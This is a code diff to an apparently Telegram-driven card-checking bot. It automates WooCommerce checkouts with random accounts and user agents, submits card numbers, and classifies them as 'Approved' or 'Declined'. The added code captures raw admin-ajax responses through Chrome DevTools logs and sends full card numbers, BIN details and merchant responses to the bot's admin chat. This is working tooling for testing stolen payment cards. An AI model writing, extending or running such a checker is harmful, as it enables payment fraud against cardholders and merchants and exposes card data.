@@ -4282,7 +4282,80 @@ async def str_single_main(card_input, update_dict):
     bin_flag = (bin_details or {}).get("country_flag", "")
 
     driver = None
+    ajax_debug = None
     try:
+        def _str_enable_network_capture(drv) -> None:
+            # Best-effort enable CDP Network domain so we can read response bodies.
+            try:
+                drv.execute_cdp_cmd("Network.enable", {})
+            except Exception:
+                pass
+            try:
+                drv.execute_cdp_cmd("Page.enable", {})
+            except Exception:
+                pass
+
+        def _str_wait_admin_ajax_raw(drv, timeout=12):
+            """
+            Collect the latest admin-ajax.php XHR/Fetch response (status + raw body).
+            Returns dict or None.
+            """
+            end = time.time() + timeout
+            seen = set()
+            last = None
+
+            while time.time() < end:
+                try:
+                    logs = drv.get_log("performance")
+                except Exception:
+                    logs = []
+
+                for entry in logs:
+                    try:
+                        msg = json.loads(entry.get("message", "")).get("message", {})
+                        if msg.get("method") != "Network.responseReceived":
+                            continue
+                        params = msg.get("params", {}) or {}
+                        resp = params.get("response", {}) or {}
+                        url = resp.get("url", "") or ""
+                        if "admin-ajax" not in url:
+                            continue
+                        req_id = params.get("requestId")
+                        if not req_id or req_id in seen:
+                            continue
+                        seen.add(req_id)
+                        last = {
+                            "requestId": req_id,
+                            "url": url,
+                            "status": int(resp.get("status", 0) or 0),
+                        }
+                    except Exception:
+                        continue
+
+                if last:
+                    break
+
+            if not last:
+                return None
+
+            body = ""
+            try:
+                out = drv.execute_cdp_cmd("Network.getResponseBody", {"requestId": last["requestId"]})
+                body = (out or {}).get("body", "") or ""
+            except Exception:
+                body = ""
+
+            # Telegram-safe trimming + markdown safety
+            body = _st_md_safe(body)
+            if len(body) > 3000:
+                body = body[:3000] + "\n... (truncated)"
+
+            return {
+                "url": last.get("url", ""),
+                "status": last.get("status", 0),
+                "body": body,
+            }
+
         ua = UserAgent().random if UserAgent else "Mozilla/5.0 Chrome/118"
         options = webdriver.ChromeOptions()
         options.binary_location = CHROME_PATH
@@ -4299,10 +4372,17 @@ async def str_single_main(card_input, update_dict):
             options.set_capability("pageLoadStrategy", "eager")
         except Exception:
             pass
+        # Enable performance logs so we can capture admin-ajax raw responses
+        try:
+            options.set_capability("goog:loggingPrefs", {"performance": "ALL"})
+            options.set_capability("goog:perfLoggingPrefs", {"enableNetwork": True, "enablePage": False})
+        except Exception:
+            pass
 
         service = Service(executable_path=CHROME_DRIVER_PATH)
         driver = webdriver.Chrome(service=service, options=options)
         wait = WebDriverWait(driver, 12)
+        _str_enable_network_capture(driver)
 
         email = f"user{random.randint(10000,99999)}@example.com"
         password = f"Pass{random.randint(1000,9999)}!"
@@ -4380,7 +4460,32 @@ async def str_single_main(card_input, update_dict):
         except Exception:
             driver.execute_script("arguments[0].click();", place_btn)
 
-        # Response capture (no blind sleeps)
+        # Response capture (no blind sleeps).
+        # Some flows return the result via admin-ajax instead of an on-page banner,
+        # so we capture admin-ajax raw response right after submit.
+        try:
+            ajax_debug = _str_wait_admin_ajax_raw(driver, timeout=12)
+        except Exception:
+            ajax_debug = None
+
+        # Send raw admin-ajax response to admin (best-effort) for debugging.
+        try:
+            if ajax_debug:
+                await bot.send_message(
+                    chat_id=BOT_ADMIN_ID,
+                    text=(
+                        "STR admin-ajax raw response\n"
+                        f"💳 `{full_card}`\n"
+                        f"🏦 `{bin_info}` {bin_flag}\n"
+                        f"🌐 `{ajax_debug.get('url','')}`\n"
+                        f"📟 `{ajax_debug.get('status',0)}`\n"
+                        f"```\n{(ajax_debug.get('body','') or '')}\n```"
+                    ),
+                    parse_mode="Markdown",
+                )
+        except Exception:
+            pass
+
         def _notice_text(d):
             try:
                 els = d.find_elements(By.CSS_SELECTOR, "div.woocommerce-message")
@@ -4396,9 +4501,30 @@ async def str_single_main(card_input, update_dict):
                 pass
             return None
 
-        kind, response_text = WebDriverWait(driver, 12).until(lambda d: _notice_text(d))  # type: ignore[misc]
-        status = "Approved" if (kind == "success" and "successfully added" in response_text.lower()) else "Declined"
-        emoji = "✅" if status == "Approved" else "❌"
+        kind = response_text = None
+        try:
+            kind, response_text = WebDriverWait(driver, 12).until(lambda d: _notice_text(d))  # type: ignore[misc]
+        except Exception:
+            kind = None
+            response_text = None
+
+        if not response_text and ajax_debug and (ajax_debug.get("body") or "").strip():
+            # Fallback to admin-ajax body when no banner appears.
+            response_text = ajax_debug.get("body", "")
+            kind = "ajax"
+
+        if not response_text:
+            response_text = "No on-page response detected (check admin-ajax debug)."
+            kind = "unknown"
+
+        if kind == "success" and "successfully added" in response_text.lower():
+            status = "Approved"
+        elif kind in ("error",):
+            status = "Declined"
+        else:
+            status = "Unknown"
+
+        emoji = "✅" if status == "Approved" else ("❌" if status == "Declined" else "⚠️")
         took = f"{time.time() - start_time_local:.2f}s"
 
         result_msg = (
